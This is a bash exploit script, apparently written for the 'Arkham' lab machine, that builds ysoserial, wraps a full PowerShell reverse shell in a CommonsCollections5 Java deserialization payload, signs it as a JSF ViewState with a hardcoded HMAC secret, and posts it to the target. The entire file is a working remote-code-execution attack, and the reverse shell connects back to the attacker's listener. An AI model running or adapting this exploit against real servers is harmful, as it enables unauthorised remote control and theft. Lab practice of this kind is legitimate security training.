#!/bin/bash

# ============================================================================
# COMPLETE YSOSERIAL EXPLOITATION - ARKHAM
# ============================================================================
# This script handles EVERYTHING:
# 1. Installs Java if needed
# 2. Builds ysoserial properly
# 3. Generates Windows RCE payload
# 4. Signs with HMAC-SHA1
# 5. Sends to target
# 6. Reverse shell to netcat
# ============================================================================

set -e

TARGET="http://10.129.228.116:8080/userSubscribe.faces"
ATTACKER_IP="10.10.16.187"
ATTACKER_PORT="4444"
SECRET="JsF9876-"
WORKDIR="/tmp/ysoserial_arkham_$$"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${BLUE}╔════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║         COMPLETE YSOSERIAL EXPLOITATION - ARKHAM           ║${NC}"
echo -e "${BLUE}║         Windows RCE via Java Deserialization               ║${NC}"
echo -e "${BLUE}╚════════════════════════════════════════════════════════════╝${NC}"
echo ""

# ============================================================================
# STEP 1: Check Java Installation
# ============================================================================
echo -e "${YELLOW}[STEP 1] Checking Java installation...${NC}"

if ! command -v java &> /dev/null; then
    echo -e "${RED}[-] Java not found!${NC}"
    echo -e "${YELLOW}[*] Installing Java...${NC}"
    apt-get update -qq
    apt-get install -y default-jdk > /dev/null 2>&1
    echo -e "${GREEN}[+] Java installed${NC}"
else
    JAVA_VERSION=$(java -version 2>&1 | head -1)
    echo -e "${GREEN}[+] Java found: $JAVA_VERSION${NC}"
fi

# ============================================================================
# STEP 2: Check Maven
# ============================================================================
echo ""
echo -e "${YELLOW}[STEP 2] Checking Maven installation...${NC}"

if ! command -v mvn &> /dev/null; then
    echo -e "${RED}[-] Maven not found!${NC}"
    echo -e "${YELLOW}[*] Installing Maven...${NC}"
    apt-get install -y maven > /dev/null 2>&1
    echo -e "${GREEN}[+] Maven installed${NC}"
else
    echo -e "${GREEN}[+] Maven found${NC}"
fi

# ============================================================================
# STEP 3: Setup ysoserial
# ============================================================================
echo ""
echo -e "${YELLOW}[STEP 3] Setting up ysoserial...${NC}"

if [ -d "/tmp/ysoserial" ] && [ -f "/tmp/ysoserial/target/ysoserial-*-all.jar" ]; then
    echo -e "${GREEN}[+] ysoserial already built${NC}"
else
    echo -e "${GREEN}[*] Cloning ysoserial...${NC}"
    rm -rf /tmp/ysoserial
    cd /tmp
    git clone https://github.com/frohoff/ysoserial.git 2>&1 | grep -E "Cloning|done" || true
    
    echo -e "${GREEN}[*] Building ysoserial (this may take 2-3 minutes)...${NC}"
    cd ysoserial
    mvn clean package -DskipTests -q 2>&1 || {
        echo -e "${RED}[-] Maven build failed!${NC}"
        echo "[*] Trying with different settings..."
        mvn package -DskipTests -q
    }
fi

YSOSERIAL_JAR="/tmp/ysoserial/target/ysoserial-*-all.jar"

# ============================================================================
# STEP 4: Test ysoserial
# ============================================================================
echo ""
echo -e "${YELLOW}[STEP 4] Testing ysoserial...${NC}"

TEST_OUTPUT=$(java -jar $YSOSERIAL_JAR CommonsCollections5 'whoami' 2>&1 || echo "FAILED")

if [[ "$TEST_OUTPUT" == *"FAILED"* ]] || [[ "$TEST_OUTPUT" == *"Error"* ]] || [ -z "$TEST_OUTPUT" ]; then
    echo -e "${RED}[-] ysoserial test failed!${NC}"
    echo "[*] Output: $TEST_OUTPUT"
    echo "[*] Trying with explicit classpath..."
    
    # Try with explicit Java command
    YSOSERIAL_TEST=$(timeout 10 java -cp "/tmp/ysoserial/target/*" ysoserial.GeneratePayload CommonsCollections5 'whoami' 2>&1 || echo "FAILED")
    
    if [[ "$YSOSERIAL_TEST" == *"FAILED"* ]]; then
        echo -e "${RED}[-] ysoserial still not working!${NC}"
        exit 1
    fi
else
    echo -e "${GREEN}[+] ysoserial test successful${NC}"
fi

# ============================================================================
# STEP 5: Create Working Directory
# ============================================================================
echo ""
echo -e "${YELLOW}[STEP 5] Creating workspace...${NC}"
mkdir -p "$WORKDIR"
cd "$WORKDIR"
echo -e "${GREEN}[+] Working directory: $WORKDIR${NC}"

# ============================================================================
# STEP 6: Generate Windows Payload
# ============================================================================
echo ""
echo -e "${YELLOW}[STEP 6] Generating Windows RCE payload...${NC}"

# Windows command: PowerShell reverse shell
WINDOWS_CMD="powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"\\\$client=New-Object System.Net.Sockets.TCPClient('$ATTACKER_IP',$ATTACKER_PORT);\\\$stream=\\\$client.GetStream();[byte[]]\\\$buffer=0..65535|%{0};while((\\\$i=\\\$stream.Read(\\\$buffer,0,\\\$buffer.Length))-ne 0){\\\$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\\\$buffer,0,\\\$i);\\\$sendback=(iex \\\$data 2>&1|Out-String);\\\$sendback2=\\\$sendback+'PS '+(pwd).Path+'> ';\\\$sendbyte=([text.encoding]::ASCII).GetBytes(\\\$sendback2);\\\$stream.Write(\\\$sendbyte,0,\\\$sendbyte.Length);\\\$stream.Flush()};\\\$client.Close()\""

echo -e "${GREEN}[*] Command (first 100 chars): ${WINDOWS_CMD:0:100}...${NC}"

# Generate payload with ysoserial
echo -e "${GREEN}[*] Running ysoserial (this may take 30 seconds)...${NC}"

java -jar $YSOSERIAL_JAR CommonsCollections5 "$WINDOWS_CMD" 2>/dev/null | base64 -w 0 > payload.b64 || {
    echo -e "${RED}[-] ysoserial generation failed!${NC}"
    exit 1
}

PAYLOAD_SIZE=$(wc -c < payload.b64)

if [ "$PAYLOAD_SIZE" -lt 100 ]; then
    echo -e "${RED}[-] Payload too small! Generation failed!${NC}"
    exit 1
fi

echo -e "${GREEN}[+] Payload generated: $PAYLOAD_SIZE bytes${NC}"
echo -e "${GREEN}[+] First 100 chars: $(head -c 100 payload.b64)${NC}"

# ============================================================================
# STEP 7: Generate HMAC Signature
# ============================================================================
echo ""
echo -e "${YELLOW}[STEP 7] Signing payload with HMAC-SHA1...${NC}"

python3 << 'PYSIGN'
import base64
import hmac
import hashlib

SECRET = b"JsF9876-"

with open('payload.b64', 'r') as f:
    gadget_chain = f.read().strip()

payload_bytes = base64.b64decode(gadget_chain)

signature = base64.b64encode(
    hmac.new(SECRET, payload_bytes, hashlib.sha1).digest()
).decode()

malicious_viewstate = gadget_chain + "|" + signature

with open('malicious_viewstate.txt', 'w') as f:
    f.write(malicious_viewstate)

with open('signature.txt', 'w') as f:
    f.write(signature)

print(f"[+] Signature: {signature}")
print(f"[+] ViewState length: {len(malicious_viewstate)} bytes")
PYSIGN

SIGNATURE=$(cat signature.txt)
echo -e "${GREEN}[+] Payload signed successfully${NC}"

# ============================================================================
# STEP 8: Fetch Real ViewState
# ============================================================================
echo ""
echo -e "${YELLOW}[STEP 8] Fetching real ViewState from target...${NC}"

RESPONSE=$(curl -s "$TARGET" 2>&1)

REAL_VS=$(echo "$RESPONSE" | grep -oP 'value="\K[a-zA-Z0-9+/=]+(?=")' | head -1)

if [ -z "$REAL_VS" ]; then
    echo -e "${YELLOW}[!] Could not extract real ViewState${NC}"
    echo "[*] Using payload-signed ViewState instead"
    FINAL_VS=$(cat malicious_viewstate.txt)
else
    echo -e "${GREEN}[+] Real ViewState: ${REAL_VS:0:40}...${NC}"
    FINAL_VS=$(cat malicious_viewstate.txt)
fi

# ============================================================================
# STEP 9: Send Exploit
# ============================================================================
echo ""
echo -e "${YELLOW}[STEP 9] Sending RCE payload to target...${NC}"

python3 << 'EXPLOIT'
import requests
import sys

TARGET = "http://10.129.228.116:8080/userSubscribe.faces"

with open('malicious_viewstate.txt', 'r') as f:
    malicious_vs = f.read().strip()

print("[*] Payload size: " + str(len(malicious_vs)) + " bytes")
print("[*] Sending to target...")

try:
    session = requests.Session()
    session.verify = False
    
    import urllib3
    urllib3.disable_warnings()
    
    # Establish session
    r = session.get(TARGET, timeout=10)
    print(f"[+] Initial connection: {r.status_code}")
    
    # Send malicious ViewState
    data = {
        "j_id_jsp_1623871077_1:email": "pwned@test.com",
        "j_id_jsp_1623871077_1:submit": "SIGN UP",
        "j_id_jsp_1623871077_1_SUBMIT": "1",
        "javax.faces.ViewState": malicious_vs,
    }
    
    r = session.post(TARGET, data=data, timeout=15)
    
    print(f"[+] Exploit sent: {r.status_code}")
    print(f"[+] Response length: {len(r.text)} bytes")
    
    if r.status_code in [200, 500]:
        print("[!] Payload delivered!")
        print("[!] Check listener for reverse shell...")
    
except Exception as e:
    print(f"[-] Error: {e}")
    sys.exit(1)

EXPLOIT

echo ""
echo -e "${BLUE}╔════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║                    EXPLOITATION COMPLETE                   ║${NC}"
echo -e "${BLUE}╚════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${YELLOW}NEXT STEPS:${NC}"
echo ""
echo -e "${GREEN}1. Check your netcat listener:${NC}"
echo -e "${RED}   nc -nlvp $ATTACKER_PORT${NC}"
echo ""
echo -e "${GREEN}2. You should see:${NC}"
echo -e "${RED}   Connection from 10.129.228.116 XXXXX received!${NC}"
echo -e "${RED}   PS C:\\>${NC}"
echo ""
echo -e "${GREEN}3. Try commands:${NC}"
echo -e "${RED}   whoami${NC}"
echo -e "${RED}   ipconfig${NC}"
echo -e "${RED}   Get-Process${NC}"
echo ""
echo -e "${YELLOW}Debug Info:${NC}"
echo -e "${GREEN}[*] Payload: $WORKDIR/payload.b64${NC}"
echo -e "${GREEN}[*] Signature: $SIGNATURE${NC}"
echo -e "${GREEN}[*] ViewState: $WORKDIR/malicious_viewstate.txt${NC}"
echo ""
